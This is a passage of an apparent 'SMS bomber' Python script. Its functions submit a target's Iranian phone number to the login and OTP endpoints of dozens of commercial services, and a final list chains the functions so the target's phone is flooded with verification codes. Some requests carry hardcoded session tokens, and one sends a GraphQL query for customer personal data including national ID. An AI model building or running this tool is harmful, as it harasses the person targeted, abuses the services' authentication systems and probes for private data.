...
def drdr_v3(phone):
    drdr_v3U = "https://drdr.ir/api/v3/auth/login/mobile/init/"
    drdr_v3H = {
        ...
        "origin": "https://drdr.ir",
        "referer": "https://drdr.ir/",
        "x-request-id": "f60d5037-b7ac-404a-9e3a-a263fd9f8054"
    }
    drdr_v3D = {
        "mobile": "0" + phone.split("+98")[1]
    }
    try:
        response = post(timeout=5, url=drdr_v3U, headers=drdr_v3H, json=drdr_v3D).json()
        if response.get("ok") == True and response.get("meta", {}).get("message", {}).get("type") == "success":
            print(f'{g}(DrDrV3) {w}Code Was Sent')
            return True
    except:
        return False

def itool(phone):
    itoolU = "https://app.itoll.com/api/v1/auth/login"
    itoolH = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        ...
        "referer": "https://itoll.com/query/car-transfer-tax?gad_source=1&gad_campaignid=22085290315&gbraid=0AAAAAqLrqMxJmL5WGWnytNTT861MU9EjW&gclid=Cj0KCQjw267GBhCSARIsAOjVJ4FbvmBs11l3CfHjOUdlH6-aImK6BEDL2ZRD7wcJJLXsslRPzUZyvZsaAs9GEALw_wcB",
        "x-login-token": "ff2af771cdad7ab4efc169e3168ab94402319086"
    }
    itoolD = {
        "mobile": "0" + phone.split("+98")[1]
    }
    try:
        response = post(timeout=5, url=itoolU, headers=itoolH, json=itoolD).json()
        if response.get("success") == True and response.get("message") == "کد ورود ارسال شد.":
...
def technolife(phone):
    ...
    technolifeH = {
        ...
        "content-security-policy": "default-src 'self';script-src 'self' 'unsafe-inline';object-src 'none';style-src 'self' 'unsafe-inline';font-src 'self' 'unsafe-inline' data: https://www.technolife.ir;upgrade-insecure-requests",
    ...
    technolifeD = {
        "query": "query { get_customer { _id isWalletLocked giftCash charge full_name number_of_basket_items email phone first_name last_name national_code } }"
    }
    try:
        response = post(timeout=5, url=technolifeU, headers=technolifeH, json=technolifeD).json()
        if "errors" not in response or response.get("data", {}).get("get_customer") is not None:
...
functions = [smarket, snap, torob, tap30, okorosh, divar, gap, sheypoor, alibaba, filmnet, drdr, drdr_v3, chmdon, itool, anar, azki, nobat, one, two, tree, fwor, five, six, seven, eyit, niyne, ten, eleven, tovelf, therty, forty, fifty, sixty, sventtubf, digikala, technolife, basalam, snapp_doctor]
